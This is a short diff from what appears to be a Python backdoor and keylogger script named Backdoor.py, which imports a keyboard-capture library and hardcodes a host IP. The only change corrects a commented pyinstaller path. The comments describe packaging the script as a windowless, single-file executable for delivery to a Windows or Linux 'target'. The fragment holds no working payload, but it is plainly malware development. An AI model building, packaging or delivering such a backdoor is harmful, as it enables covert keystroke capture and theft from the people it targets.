@@ -12,7 +12,7 @@ import pynput.keyboard
 host_ip = "192.168.2.8" 
 #first before deliver make it exe or linux executable file :
 #Linux User Setup wine environment with python3 directory
-# target is windows then command : wine /root/.wine/drive_c/pyinstaller.exe --onefile --noconsole Backdoor.py 
+# target is windows then command : wine /root/.wine/drive_c/Python/Scripts/pyinstaller.exe --onefile --noconsole Backdoor.py 
 # target is linux then command : pyinstaller --onefile --noconsole Backdoor.py 
 keys = ""
 try:
